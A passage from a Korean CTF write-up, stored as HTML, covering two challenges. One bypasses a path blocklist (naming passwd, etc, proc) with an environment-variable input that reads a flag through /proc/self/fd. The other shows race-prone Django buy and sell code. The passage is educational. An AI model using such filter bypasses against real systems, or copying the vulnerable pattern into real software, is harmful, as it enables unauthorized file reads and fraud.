&amp;#xB9CC;&amp;#xB4E4;&amp;#xACE0; &amp;#xD574;&amp;#xB2F9; path&amp;#xB97C; &amp;#xC77D;&amp;#xAE30;&amp;#xBAA8;&amp;#xB4DC;&amp;#xB85C; &amp;#xC5F4;&amp;#xC5B4;&amp;#xC11C; &amp;#xB0B4;&amp;#xC6A9;&amp;#xC744; &amp;#xCD9C;&amp;#xB825;&amp;#xD558;&amp;#xBA74;&amp;#xC11C; &amp;#xB05D;&amp;#xB0A9;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xC81C; &amp;#xC911;&amp;#xC694;&amp;#xD55C; filtering &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;filtering&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;filename&lt;/span&gt;):&lt;/span&gt;
    FILTER = [&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;flag&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;etc&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;home&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;~/&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;/~&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;dev&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;proc&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;passwd&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;group&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;run&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;usr&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;var&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;opt&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;..&amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;./&amp;apos;&lt;/span&gt;]
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; FILTER:
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; i &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; filename:
            print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;Invalid filename&amp;apos;&lt;/span&gt;)
            sys.exit(&lt;span class=&#34;hljs-number&#34;&gt;-1&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xBB38;&amp;#xC81C;&amp;#xC758; filtering &amp;#xD568;&amp;#xC218;&amp;#xB294; lib&amp;#xC744; &amp;#xC81C;&amp;#xC678;&amp;#xD55C; &amp;#xB9AC;&amp;#xB205;&amp;#xC2A4;&amp;#xC758; &amp;#xAE30;&amp;#xBCF8; &amp;#xB514;&amp;#xB809;&amp;#xD130;&amp;#xB9AC;&amp;#xC640; flag &amp;#xBB38;&amp;#xC790;&amp;#xC5F4;&amp;#xC744; &amp;#xD3EC;&amp;#xD568;&amp;#xD558;&amp;#xACE0;&amp;#xB9CC; &amp;#xC788;&amp;#xC73C;&amp;#xBA74; &lt;code&gt;sys.exit(-1)&lt;/code&gt;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xBE44;&amp;#xC815;&amp;#xC0C1; &amp;#xC885;&amp;#xB8CC;&amp;#xC2DC;&amp;#xD0B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;FILTER&lt;/code&gt; &amp;#xB9AC;&amp;#xC2A4;&amp;#xD2B8;&amp;#xC5D0; &amp;#xAC78;&amp;#xB9AC;&amp;#xC9C0; &amp;#xC54A;&amp;#xACE0; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xC77D;&amp;#xC73C;&amp;#xB824;&amp;#xBA74; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xD574;&amp;#xC57C; &amp;#xD560;&amp;#xAE4C;&amp;#xC694;? &lt;/p&gt;
&lt;p&gt;&amp;#xC55E;&amp;#xC11C; Dockerfile&amp;#xC5D0;&amp;#xC11C; &amp;#xBD10;&amp;#xB454; &amp;#xD658;&amp;#xACBD;&amp;#xBCC0;&amp;#xC218;&amp;#xB97C; &amp;#xC774;&amp;#xC6A9;&amp;#xD574;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. linux&amp;#xC5D0;&amp;#xC11C; proc file system&amp;#xC740; &amp;#xC6B4;&amp;#xC601;&amp;#xCCB4;&amp;#xC81C;&amp;#xC758; &amp;#xAC01;&amp;#xC885; &amp;#xC815;&amp;#xBCF4;&amp;#xB97C; &amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC;&amp;#xC5D0;&amp;#xC11C; &amp;#xC811;&amp;#xADFC;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB3C4;&amp;#xB85D; &amp;#xB3C4;&amp;#xC640;&amp;#xC8FC;&amp;#xB294; &amp;#xAC00;&amp;#xC0C1;&amp;#xC758; &amp;#xD30C;&amp;#xC77C; &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBB3C;&amp;#xB860; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xC815;&amp;#xBCF4;&amp;#xB3C4; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xBA70; &amp;#xC774;&amp;#xB294; &lt;code&gt;/proc/{pid}&lt;/code&gt; &amp;#xACBD;&amp;#xB85C;&amp;#xC5D0; &amp;#xC704;&amp;#xCE58;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC800;&amp;#xD76C;&amp;#xAC00; pid&amp;#xB97C; &amp;#xC54C;&amp;#xC544;&amp;#xB0BC; &amp;#xC218; &amp;#xC5C6;&amp;#xB294;&amp;#xB370; &amp;#xBB34;&amp;#xC791;&amp;#xC815; bruteforce&amp;#xB97C; &amp;#xD574;&amp;#xC57C; &amp;#xD560;&amp;#xAE4C;&amp;#xC694;? &amp;#xBB3C;&amp;#xB860; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xAC00; &amp;#xBA87; &amp;#xAC1C; &amp;#xB3D9;&amp;#xC791;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xB294; &amp;#xAC04;&amp;#xB2E8;&amp;#xD55C; &amp;#xC11C;&amp;#xBE44;&amp;#xC2A4;&amp;#xB77C; &amp;#xAC00;&amp;#xB2A5;&amp;#xC740; &amp;#xD588;&amp;#xACA0;&amp;#xC9C0;&amp;#xB9CC;, &amp;#xB354; &amp;#xD3B8;&amp;#xD558;&amp;#xACE0; &amp;#xD655;&amp;#xC2E4;&amp;#xD55C; &amp;#xBC29;&amp;#xBC95;&amp;#xC774; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBC14;&amp;#xB85C; &amp;#xD604;&amp;#xC7AC; &amp;#xC2E4;&amp;#xD589; &amp;#xC911;&amp;#xC778; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC758; &amp;#xC815;&amp;#xBCF4;&amp;#xAC00; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &lt;code&gt;/proc/self&lt;/code&gt;&amp;#xB97C; &amp;#xC774;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC758; &amp;#xC815;&amp;#xBCF4;&amp;#xAC00; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xB294; &amp;#xACF3;&amp;#xC740; &amp;#xD655;&amp;#xC778;&amp;#xD588;&amp;#xACE0; flag&amp;#xD30C;&amp;#xC77C;&amp;#xC740; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xC77D;&amp;#xC5B4;&amp;#xC57C; &amp;#xD560;&amp;#xAE4C;&amp;#xC694;? &lt;/p&gt;
&lt;p&gt;&amp;#xC800;&amp;#xD76C;&amp;#xAC00; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4; &amp;#xB0B4;&amp;#xC5D0;&amp;#xC11C; &amp;#xD30C;&amp;#xC77C;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD560; &amp;#xB54C; &amp;#xC6B4;&amp;#xC601;&amp;#xCCB4;&amp;#xC81C;&amp;#xB294; file descriptor&amp;#xB77C;&amp;#xB294; &amp;#xC815;&amp;#xC218; &amp;#xAC12;&amp;#xC744; &amp;#xD560;&amp;#xB2F9;&amp;#xD574;&amp;#xC8FC;&amp;#xACE0; &amp;#xC774; &amp;#xAC12;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; open&amp;#xB4F1;&amp;#xC758; syscall&amp;#xC5D0;&amp;#xC11C; &amp;#xD574;&amp;#xB2F9; &amp;#xD30C;&amp;#xC77C;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xC81C; &amp;#xC800;&amp;#xD76C;&amp;#xB294; &lt;code&gt;/proc/{pid}/fd/{fd_value:int}&lt;/code&gt; &amp;#xACBD;&amp;#xB85C;&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &amp;#xC2EC;&amp;#xBCFC;&amp;#xB9AD; &amp;#xB9C1;&amp;#xD06C;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; python process&amp;#xC5D0;&amp;#xC11C; &amp;#xC5F4;&amp;#xB824;&amp;#xC788;&amp;#xB294; flag&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD558;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;flag&amp;#xD30C;&amp;#xC77C;&amp;#xC758; fd&amp;#xAC12;&amp;#xC740; &amp;#xC8FC;&amp;#xC5B4;&amp;#xC9C4; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xC774;&amp;#xC6A9;&amp;#xD574; &amp;#xAC19;&amp;#xC740; &amp;#xD658;&amp;#xACBD;&amp;#xC744; &amp;#xAD6C;&amp;#xC131; &amp;#xD6C4; lsof &amp;#xBA85;&amp;#xB839;&amp;#xC5B4;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xD655;&amp;#xC778;&amp;#xD558;&amp;#xAC70;&amp;#xB098; &amp;#xD574;&amp;#xB2F9; &amp;#xBB38;&amp;#xC81C;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xD30C;&amp;#xC77C;&amp;#xC774; &amp;#xB9CE;&amp;#xC774; &amp;#xC5F4;&amp;#xB9AC;&amp;#xC9C0; &amp;#xC54A;&amp;#xC73C;&amp;#xBBC0;&amp;#xB85C; 2 &amp;#xC774;&amp;#xC0C1;&amp;#xC758; &amp;#xAC12;&amp;#xC73C;&amp;#xB85C; bruteforce&amp;#xB97C; &amp;#xD574;&amp;#xB3C4; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;lsof&lt;/code&gt; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xD655;&amp;#xC778;&amp;#xD558;&amp;#xB294; &amp;#xBC95;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&amp;#xC8FC;&amp;#xC5B4;&amp;#xC9C4; Dockerfile&amp;#xC744; &amp;#xBE4C;&amp;#xB4DC; &amp;#xD6C4; &amp;#xC2E4;&amp;#xD589;&lt;/p&gt;
&lt;p&gt; &lt;code&gt;docker build -t readme-hc .&lt;/code&gt;&lt;/p&gt;
&lt;p&gt; &lt;code&gt;docker run -itd -p 9999:9999 readme-hc&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;netcat&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xC811;&amp;#xC18D; &amp;#xD6C4; ps, grep&amp;#xC744; &amp;#xD1B5;&amp;#xD574; pid &amp;#xD655;&amp;#xC778;&lt;/p&gt;
&lt;p&gt; &lt;code&gt;ps -ef | grep python&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;lsof -p {pid}&lt;/code&gt;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; /flag&amp;#xC758; fd &amp;#xD655;&amp;#xC778;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;/2023/09/03/l0ch/hackingcamp_review/readme1.png&#34; alt=&#34;readm1&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xC81C; &amp;#xB9C8;&amp;#xBB34;&amp;#xB9AC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/09/03/l0ch/hackingcamp_review/readme2.png&#34; alt=&#34;readme2&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC704; API &amp;#xBB38;&amp;#xC11C;&amp;#xB97C; &amp;#xBCF4;&amp;#xBA74; &lt;code&gt;os.path.expandvars&lt;/code&gt;&amp;#xB294; &amp;#xD658;&amp;#xACBD;&amp;#xBCC0;&amp;#xC218;&amp;#xC5D0; &lt;code&gt;key=value&lt;/code&gt;&amp;#xAC00; &amp;#xC874;&amp;#xC7AC;&amp;#xD55C;&amp;#xB2E4;&amp;#xBA74; &lt;code&gt;$key/path&lt;/code&gt;&amp;#xC640; &amp;#xAC19;&amp;#xC740; path string&amp;#xC744; &lt;code&gt;value/path&lt;/code&gt;&amp;#xB85C; &amp;#xBC14;&amp;#xAFD4;&amp;#xC8FC;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC55E;&amp;#xC11C; Dockerfile&amp;#xC744; &amp;#xBD84;&amp;#xC11D;&amp;#xD560; &amp;#xB54C; &amp;#xD655;&amp;#xC778;&amp;#xD588;&amp;#xB358; &lt;code&gt;CONFIG=/proc&lt;/code&gt;&amp;#xC744; &amp;#xD65C;&amp;#xC6A9;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;$CONFIG/self/fd/6&lt;/code&gt;&amp;#xB97C; &amp;#xC785;&amp;#xB825;&amp;#xD558;&amp;#xC5EC; flag&amp;#xB97C; &amp;#xC77D;&amp;#xC73C;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/09/03/l0ch/hackingcamp_review/readme3.png&#34; alt=&#34;readme3&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;flag-shop-syru&#34;&gt;&lt;a href=&#34;#flag-shop-syru&#34; class=&#34;headerlink&#34; title=&#34;flag shop - syru&#34;&gt;&lt;/a&gt;&lt;strong&gt;flag shop - syru&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;&amp;#xC0AC;&amp;#xC2E4; &amp;#xC800;&amp;#xB294; HCAMP CTF &amp;#xC815;&amp;#xADDC; &amp;#xC2DC;&amp;#xAC04;&amp;#xC758; &amp;#xB300;&amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xC774; &amp;#xBB38;&amp;#xC81C;&amp;#xC5D0; &amp;#xC3DF;&amp;#xC558;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC55E;&amp;#xC120; sstf&amp;#xC5D0;&amp;#xC11C; django 1day&amp;#xB97C; &amp;#xD65C;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; &amp;#xBE44;&amp;#xC2B7;&amp;#xD55C; &amp;#xC720;&amp;#xD615;&amp;#xC758; &lt;a href=&#34;https://hackyboiz.github.io/2023/09/01/syru/sstf-web-libreria/&#34;&gt;&amp;#xBB38;&amp;#xC81C;&lt;/a&gt;&amp;#xB97C; &amp;#xD480;&amp;#xC5B4;&amp;#xBD10;&amp;#xC11C; &amp;#xAF2D; &amp;#xD480;&amp;#xACE0; &amp;#xC2F6;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC544;&amp;#xC27D;&amp;#xAC8C; &amp;#xC9C0;&amp;#xAE08;&amp;#xC740; &amp;#xBB38;&amp;#xC81C; &amp;#xC11C;&amp;#xBC84;&amp;#xB3C4; &amp;#xB2EB;&amp;#xD600;&amp;#xC11C; &amp;#xC874;&amp;#xC7AC;&amp;#xD588;&amp;#xB358; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xACFC; &amp;#xC81C;&amp;#xAC00; &amp;#xADF8; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC744; &amp;#xD65C;&amp;#xC6A9;&amp;#xD574; &amp;#xD47C; &amp;#xBC29;&amp;#xBC95;&amp;#xB9CC; &amp;#xAC04;&amp;#xB2E8;&amp;#xD788; &amp;#xC18C;&amp;#xAC1C;&amp;#xD574;&amp;#xB4DC;&amp;#xB9AC;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;flag shop&amp;#xC740; flag &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xC5EC;&amp;#xB7EC; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC744; &amp;#xD30C;&amp;#xB294; django framework&amp;#xB85C; &amp;#xB9CC;&amp;#xB4E4;&amp;#xC5B4;&amp;#xC9C4; service&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. (&lt;del&gt;&amp;#xD06C;&amp;#xB86C; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xC2F8;&amp;#xB354;&amp;#xAD70;&amp;#xC694;. &amp;#xC9C4;&amp;#xC9DC; &amp;#xC92C;&amp;#xC73C;&amp;#xBA74; crbug&amp;#xC5D0; &amp;#xC81C;&amp;#xBCF4;&amp;#xD560; &amp;#xBED4;&amp;#x2026;&lt;/del&gt;)&lt;/p&gt;
&lt;p&gt;&amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC744; &amp;#xC0AC;&amp;#xAE30;&amp;#xB9CC; &amp;#xD560; &amp;#xBFD0; &amp;#xC544;&amp;#xB2C8;&amp;#xB77C; &amp;#xC0C0;&amp;#xB358; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC744; &amp;#xD314; &amp;#xC218; &amp;#xC788;&amp;#xB294;&amp;#xB370;&amp;#xC694;. &amp;#xC774; &amp;#xC0AC;&amp;#xACE0;&amp;#xD30C;&amp;#xB294; &amp;#xACFC;&amp;#xC815;&amp;#xC5D0;&amp;#xC11C; race condition &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xC600;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;OrderAPIView&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;APIView&lt;/span&gt;):&lt;/span&gt;
    permission_classes = []

    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;get&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;self, request, product_id=None, order_id=None&lt;/span&gt;):&lt;/span&gt;
        ...
        &lt;span class=&#34;hljs-comment&#34;&gt;# user validation&lt;/span&gt;
        balance = request.user.balance
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; balance &amp;lt; product.price:
            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; fail(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Insufficient balance&amp;quot;&lt;/span&gt;)

        order = OrderModel.objects.create(
            user=request.user,
            product=product,
            email=email,
        )

        validator = EmailValidator()
        &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt;:
            validator(email)
        &lt;span class=&#34;hljs-keyword&#34;&gt;except&lt;/span&gt; ValidationError:
            order.email = &lt;span class=&#34;hljs-literal&#34;&gt;None&lt;/span&gt;
            order.save()

        request.user.balance -= product.price
        request.user.save()

        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; success(OrderSerializer(order).data)

&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Sell&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;APIView&lt;/span&gt;):&lt;/span&gt;
    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;get&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;self, request, order_id=None&lt;/span&gt;):&lt;/span&gt;
        &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt;:
            order = OrderModel.objects.get(id=order_id)
        &lt;span class=&#34;hljs-keyword&#34;&gt;except&lt;/span&gt; OrderModel.DoesNotExist:
            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; fail(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Order not found&amp;quot;&lt;/span&gt;)

        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; order.user != request.user:
            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; fail(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Unauthorized&amp;quot;&lt;/span&gt;)

        request.user.balance += order.product.price
        request.user.save()

        order.delete()

        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; success({})
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xD3C9;&amp;#xBC94;&amp;#xD558;&amp;#xAC8C; &amp;#xC0AC;&amp;#xACE0;&amp;#xD30C;&amp;#xB294; &amp;#xAC83; &amp;#xAC19;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC774; &amp;#xAC00;&amp;#xAC8C;&amp;#xB294; &amp;#xC0C1;&amp;#xB300;&amp;#xBC29;&amp;#xC744; &amp;#xC2E0;&amp;#xB8B0;&amp;#xD558;&amp;#xC5EC; &amp;#xD314; &amp;#xB54C;&amp;#xB294; &amp;#xBB3C;&amp;#xAC74;&amp;#xC744; &amp;#xBA3C;&amp;#xC800; &amp;#xC8FC;&amp;#xACE0; &amp;#xC0B4; &amp;#xB54C;&amp;#xB294; &amp;#xB3C8;&amp;#xC744; &amp;#xBA3C;&amp;#xC800; &amp;#xC90D;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC800;&amp;#xD76C;&amp;#xB294; &amp;#xC774; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xC774;&amp;#xC81C;&amp;#xBD80;&amp;#xD130; &amp;#xACF5;&amp;#xB7B5;&amp;#xD560; &amp;#xAC83;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBB3C;&amp;#xB860; &amp;#xD314; &amp;#xB54C;&amp;#xB294; &amp;#xBCF4;&amp;#xC720; &amp;#xC794;&amp;#xC561;&amp;#xC744; &amp;#xAC80;&amp;#xC0AC;&amp;#xD558;&amp;#xACE0; &amp;#xC0B4; &amp;#xB54C;&amp;#xB294; &amp;#xC8FC;&amp;#xBB38;&amp;#xC774; &amp;#xC788;&amp;#xC5C8;&amp;#xB358; &amp;#xBB3C;&amp;#xD488;&amp;#xC778;&amp;#xC9C0;&amp;#xB97C; &amp;#xAC80;&amp;#xC0AC;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xC548;&amp;#xC804;&amp;#xD574; &amp;#xBCF4;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xACFC;&amp;#xC5F0; &amp;#xADF8;&amp;#xB7F4;&amp;#xAE4C;&amp;#xC694;?&lt;/p&gt;
&lt;p&gt;&amp;#xC774; &amp;#xC11C;&amp;#xBE44;&amp;#xC2A4;&amp;#xB294; db&amp;#xB85C; sqlite3&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;DATABASES = {
    &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;default&amp;apos;&lt;/span&gt;: {
        &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;ENGINE&amp;apos;&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;django.db.backends.sqlite3&amp;apos;&lt;/span&gt;,
        &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;NAME&amp;apos;&lt;/span&gt;: BASE_DIR / &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;db.sqlite3&amp;apos;&lt;/span&gt;,
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;sqlite3&amp;#xB294; &amp;#xB2E4;&amp;#xC218;&amp;#xC758; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xAC00; &amp;#xD558;&amp;#xB098;&amp;#xC758; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xBCA0;&amp;#xC774;&amp;#xC2A4; &amp;#xD30C;&amp;#xC77C;&amp;#xC5D0; &amp;#xC77D;&amp;#xACE0; &amp;#xC4F0;&amp;#xB294; &amp;#xAD6C;&amp;#xC870;&amp;#xC778;&amp;#xB370; &amp;#xBB34;&amp;#xACB0;&amp;#xC131;&amp;#xC744; &amp;#xBCF4;&amp;#xC7A5;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; Lock&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC77D;&amp;#xC744; &amp;#xB54C;&amp;#xB294; shared lock&amp;#xC774; &amp;#xAC78;&amp;#xB9AC;&amp;#xBA70; &amp;#xC4F8; &amp;#xB54C;&amp;#xB294; exclusive lock&amp;#xC774; &amp;#xAC78;&amp;#xB9AC;&amp;#xB294;&amp;#xB370; exclusive lock&amp;#xC740; &amp;#xD558;&amp;#xB098;&amp;#xB9CC; &amp;#xD5C8;&amp;#xC6A9;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB798;&amp;#xC11C; &amp;#xD574;&amp;#xB2F9; &amp;#xC11C;&amp;#xBE44;&amp;#xC2A4;&amp;#xB85C; &amp;#xB3D9;&amp;#xC2DC;&amp;#xC5D0; &amp;#xB4E4;&amp;#xC5B4;&amp;#xC628; &amp;#xAD6C;&amp;#xB9E4; &amp;#xBC0F; &amp;#xD310;&amp;#xB9E4; &amp;#xC694;&amp;#xCCAD;&amp;#xC740; &amp;#xC870;&amp;#xAE08;&amp;#xC758; delay&amp;#xB97C; &amp;#xB450;&amp;#xACE0; &amp;#xCC98;&amp;#xB9AC;&amp;#xB418;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
